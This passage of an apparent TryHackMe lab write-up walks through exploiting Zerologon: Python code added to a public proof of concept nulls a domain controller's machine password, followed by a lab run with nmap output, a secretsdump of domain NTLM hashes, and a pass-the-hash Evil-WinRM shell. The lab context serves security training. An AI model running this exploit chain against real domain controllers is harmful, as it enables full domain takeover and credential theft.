</span></span><span class=line><span class=cl>  <span class=n>DWORD</span> <span class=n>Timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>And suddenly we&rsquo;ve hit another unknown, NETLOGON_CREDENTIAL. Fortunately, Microsoft does have documentation for <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d55e2632-7163-4f6c-b662-4b870e8cc1cd target=_blank rel=noreferrer>NETLOGON_CREDENTIAL</a> as well:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> typedef struct _NETLOGON_CREDENTIAL <span class=o>{</span>
</span></span><span class=line><span class=cl>  CHAR data<span class=o>[</span>8<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span> NETLOGON_CREDENTIAL,
</span></span><span class=line><span class=cl> *PNETLOGON_CREDENTIAL<span class=p>;</span></span></span></code></pre></div></div><p>Per the documentation, NETLOGON_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that &ldquo;the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation&rdquo;, fortunately we know this value, thanks to Zero Logon, it&rsquo;s 8 bytes of Zero. In terms of the Timestamp, it&rsquo;s a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me.</p><p>In order to change the password the Microsoft Documentation states that:
The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes.
For the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we&rsquo;re setting it to a null value now.</p><h3 class="relative group">Level up<div id=level-up class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#level-up aria-label=Anchor>#</a></span></h3><p>Now that we know the required arguments to change the password via NRPC, we actually have to implement it in Python. We need to take a look at the <a href=https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py target=_blank rel=noreferrer>nrpc.py</a> module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hNetrServerPasswordSet2</span><span class=p>(</span><span class=n>dce</span><span class=p>,</span> <span class=n>primaryName</span><span class=p>,</span> <span class=n>accountName</span><span class=p>,</span> <span class=n>secureChannelType</span><span class=p>,</span> <span class=n>computerName</span><span class=p>,</span> <span class=n>authenticator</span><span class=p>,</span> <span class=n>clearNewPasswordBlob</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span> <span class=o>=</span> <span class=n>NetrServerPasswordSet2</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;PrimaryName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>checkNullString</span><span class=p>(</span><span class=n>primaryName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;AccountName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>checkNullString</span><span class=p>(</span><span class=n>accountName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;SecureChannelType&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>secureChannelType</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;ComputerName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>checkNullString</span><span class=p>(</span><span class=n>computerName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;Authenticator&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>authenticator</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;ClearNewPassword&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>clearNewPasswordBlob</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>dce</span><span class=o>.</span><span class=n>request</span><span class=p>(</span><span class=n>request</span><span class=p>)</span></span></span></code></pre></div></div><p>As expected, most of the field names are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>NETLOGON_AUTHENTICATOR</span><span class=p>(</span><span class=n>NDRSTRUCT</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>structure</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;Credential&#39;</span><span class=p>,</span> <span class=n>NETLOGON_CREDENTIAL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;Timestamp&#39;</span><span class=p>,</span> <span class=n>DWORD</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span></span></span></code></pre></div></div><p>The format here is a little bit different compared to the prior, but we&rsquo;ll adjust accordingly when we go to slot it into the PoC, but while we&rsquo;re talking about slotting it into the PoC, where will our added code go?</p><p>Our added code will go immediately before &ldquo;return rpc_con&rdquo; on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we&rsquo;ll need to add to the PoC, we&rsquo;ll save you the painstaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it.</p><p><strong>The Additional Code we&rsquo;re slotting in:</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>newPassRequest</span> <span class=o>=</span> <span class=n>nrpc</span><span class=o>.</span><span class=n>NetrServerPasswordSet2</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;PrimaryName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>dc_handle</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;AccountName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_computer</span> <span class=o>+</span> <span class=s1>&#39;$</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;SecureChannelType&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>nrpc</span><span class=o>.</span><span class=n>NETLOGON_SECURE_CHANNEL_TYPE</span><span class=o>.</span><span class=n>ServerSecureChannel</span>
</span></span><span class=line><span class=cl>    <span class=n>auth</span> <span class=o>=</span> <span class=n>nrpc</span><span class=o>.</span><span class=n>NETLOGON_AUTHENTICATOR</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>auth</span><span class=p>[</span><span class=s1>&#39;Credential&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>auth</span><span class=p>[</span><span class=s1>&#39;Timestamp&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;Authenticator&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>auth</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;ComputerName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_computer</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;ClearNewPassword&#39;</span><span class=p>]</span> <span class=o>=</span>  <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>516</span>
</span></span><span class=line><span class=cl>    <span class=n>rpc_con</span><span class=o>.</span><span class=n>request</span><span class=p>(</span><span class=n>newPassRequest</span><span class=p>)</span></span></span></code></pre></div></div><p>At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found here:</p><p><a href=https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py target=_blank rel=noreferrer>https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py</a></p><h3 class="relative group">Answers<div id=answers class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#answers aria-label=Anchor>#</a></span></h3><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=Flag src=https://raw.githubusercontent.com/anir0y/thm-notes/main/zerologon/img/Pasted%20image%2020210509234755.png></figure><hr><h2 class="relative group">Lab it UP!<div id=lab-it-up class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#lab-it-up aria-label=Anchor>#</a></span></h2><h3 class="relative group">Nmap Result<div id=nmap-result class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#nmap-result aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sC -sV -oA nmap/DC01HOLOLIVE 10.10.129.187 
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-09 23:51 IST
</span></span><span class=line><span class=cl>Stats: 0:00:56 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Script Scan
</span></span><span class=line><span class=cl>NSE Timing: About 99.26% <span class=k>done</span><span class=p>;</span> ETC: 23:52 <span class=o>(</span>0:00:00 remaining<span class=o>)</span>
</span></span><span class=line><span class=cl>Stats: 0:00:56 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Script Scan
</span></span><span class=line><span class=cl>NSE Timing: About 99.26% <span class=k>done</span><span class=p>;</span> ETC: 23:52 <span class=o>(</span>0:00:00 remaining<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.129.187
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.16s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>987</span> closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp   open  domain        Simple DNS Plus
</span></span><span class=line><span class=cl>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2021-05-09 18:21:42Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: hololive.local0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?
</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: hololive.local0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp open  tcpwrapped
</span></span><span class=line><span class=cl>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: DC01
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-05-09T18:22:11+00:00
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-05-08T18:20:30
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2021-11-07T18:20:30
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-05-09T18:22:20+00:00<span class=p>;</span> 0s from scanner time.
</span></span><span class=line><span class=cl>Service Info: Host: DC01<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2021-05-09T18:22:11
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 78.14 seconds</span></span></code></pre></div></div><hr><h3 class="relative group">What is the NetBIOS name of the Domain Controller?<div id=what-is-the-netbios-name-of-the-domain-controller class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#what-is-the-netbios-name-of-the-domain-controller aria-label=Anchor>#</a></span></h3><h4 class="relative group">ANS: DC01<div id=ans-dc01 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#ans-dc01 aria-label=Anchor>#</a></span></h4><p><strong>Explanation</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#Nmap snip </span>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span><span class=line><span class=cl>.3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: <span class=s2>&#34;DC01&#34;</span> <span class=c1>#Here is the ans</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-05-09T18:22:11+00:00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span></span></span></code></pre></div></div><hr><h3 class="relative group">What is the NetBIOS domain name of the network?<div id=what-is-the-netbios-domain-name-of-the-network class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#what-is-the-netbios-domain-name-of-the-network aria-label=Anchor>#</a></span></h3><h4 class="relative group">ANS: HOLOLIVE<div id=ans-hololive class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#ans-hololive aria-label=Anchor>#</a></span></h4><p><strong>Explanation</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#Nmap snip </span>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span><span class=line><span class=cl>.3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: <span class=s2>&#34;HOLOLIVE&#34;</span> <span class=c1>#Here is the ans</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: DC01 
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-05-09T18:22:11+00:00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span></span></span></code></pre></div></div><hr><h3 class="relative group">What domain are you attacking?<div id=what-domain-are-you-attacking class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#what-domain-are-you-attacking aria-label=Anchor>#</a></span></h3><h4 class="relative group">ANS: hololive.local<div id=ans-hololivelocal class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#ans-hololivelocal aria-label=Anchor>#</a></span></h4><p><strong>Explanation</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#Nmap snip </span>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span><span class=line><span class=cl>.3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: HOLOLIVE 
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: DC01 
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: <span class=s2>&#34;hololive.local&#34;</span> <span class=c1># ANS</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-05-09T18:22:11+00:00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span></span></span></code></pre></div></div><hr><h3 class="relative group">What is the Local Administrator&rsquo;s NTLM hash?<div id=what-is-the-local-administrators-ntlm-hash class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#what-is-the-local-administrators-ntlm-hash aria-label=Anchor>#</a></span></h3><h4 class="relative group">ANS: 3f3ef89114fb063e3d7fc23c20f65568<div id=ans--3f3ef89114fb063e3d7fc23c20f65568 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#ans--3f3ef89114fb063e3d7fc23c20f65568 aria-label=Anchor>#</a></span></h4><p><strong>Explanation</strong></p><h4 class="relative group">Activate Venv<div id=activate-venv class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#activate-venv aria-label=Anchor>#</a></span></h4><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>source</span> impacketEnv/bin/activate
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>impacketEnv<span class=o>)</span> <span class=o>[</span><span class=o>]</span><span class=o>[</span>mentor@attackerVM<span class=o>]</span><span class=o>[</span>~/thm/zer0login<span class=o>]</span>
</span></span><span class=line><span class=cl> <span class=nv>$python3</span> zeroLogon.py DC01 10.10.129.187
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> _____                   __                         
</span></span><span class=line><span class=cl>/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  
</span></span><span class=line><span class=cl><span class=se>\/</span>/ / / _ <span class=se>\ </span><span class=s1>&#39;__/ _ \   / /  / _ \ / _` |/ _ \| &#39;</span>_ <span class=se>\ </span>
</span></span><span class=line><span class=cl> / //<span class=se>\ </span> __/ <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> / /__<span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>/____/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>__/  <span class=se>\_</span>___/<span class=se>\_</span>__/ <span class=se>\_</span>_, <span class=p>|</span><span class=se>\_</span>__/<span class=p>|</span>_<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span>
</span></span><span class=line><span class=cl>                                  <span class=p>|</span>___/             
</span></span><span class=line><span class=cl>                Vulnerability Discovered by Tom Tervoort
</span></span><span class=line><span class=cl>                              Exploit by Ronnie Bartwitz
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>Performing authentication attempts...
</span></span><span class=line><span class=cl>Failure to Autheticate at attempt number: <span class=m>28</span>
</span></span><span class=line><span class=cl>Failure to Autheticate at attempt number: <span class=m>86</span>
</span></span><span class=line><span class=cl>Zero Logon successfully exploited, changing password.</span></span></code></pre></div></div><h3 class="relative group">Password dumping:<div id=password-dumping class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#password-dumping aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> <span class=nv>$secretsdump</span>.py -just-dc -no-pass DC01<span class=se>\$</span>@10.10.129.187
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping Domain Credentials <span class=o>(</span>domain<span class=se>\u</span>id:rid:lmhash:nthash<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class=s2>&#34;3f3ef89114fb063e3d7fc23c20f65568&#34;</span>:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
</span></span><span class=line><span class=cl>hololive.local<span class=se>\a</span>-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
</span></span><span class=line><span class=cl>hololive.local<span class=se>\a</span>-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Cleaning up... </span></span></code></pre></div></div><hr><h3 class="relative group">How many Domain Admin accounts are there?<div id=how-many-domain-admin-accounts-are-there class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#how-many-domain-admin-accounts-are-there aria-label=Anchor>#</a></span></h3><h4 class="relative group">ANS: 2<div id=ans--2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#ans--2 aria-label=Anchor>#</a></span></h4><p><strong>Explaination</strong></p><p>Naming policy, Administrator accounts are having &lsquo;A-&rsquo; as Firt initial.</p><hr><h3 class="relative group">What is the root flag?<div id=what-is-the-root-flag class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#what-is-the-root-flag aria-label=Anchor>#</a></span></h3><h4 class="relative group">ANS:<div id=ans class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#ans aria-label=Anchor>#</a></span></h4><h3 class="relative group">Pass the Hash<div id=pass-the-hash class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#pass-the-hash aria-label=Anchor>#</a></span></h3><h4 class="relative group">Evil-WinRm with NTLM Hash!<div id=evil-winrm-with-ntlm-hash class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#evil-winrm-with-ntlm-hash aria-label=Anchor>#</a></span></h4><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>mentor@attackerVM<span class=o>]</span><span class=o>[</span>~/thm/zer0login<span class=o>]</span>
</span></span><span class=line><span class=cl> <span class=nv>$evil</span>-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.129.187 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; dir
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ../Desktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; dir
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>-a----        9/20/2020   2:02 PM             <span class=m>24</span> root.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
